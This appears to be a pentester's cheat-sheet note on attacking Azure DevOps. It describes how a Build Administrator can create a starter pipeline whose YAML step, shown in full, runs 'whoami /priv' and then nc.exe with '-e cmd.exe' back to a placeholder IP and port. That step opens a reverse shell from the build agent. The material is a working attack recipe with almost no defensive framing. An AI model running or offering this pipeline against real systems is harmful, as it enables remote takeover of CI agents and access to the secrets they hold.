# azure cloud

## user-perms (authenticated)

```bash
# look at (bottom left) Project Settings > Security > 

Role info: 
Build Administator: can define builds using CI pipeline
```

## RCE using pipeline method

Can use Python pipeline too.

```bash
1. to find agent-pools
(top-left) Azure DevOps > (bottom-left) Collection Settings > Agent Pools
| note: pool name

2. RCE using starter-pipeline
Pipelines > New > 
(select where is project hosted): Azure Repo Git
(select repo): 
(type of pipeline): Starter Pipeline

# modified.yaml
trigger:
- master

pool: 'POOLNAME'

steps:
- script: |
    whoami /priv
    C:\Windows\System32\cmd.exe /c C:\Users\Public\nc.exe -e cmd.exe IP PORT
  displayName: 'kashz'
```
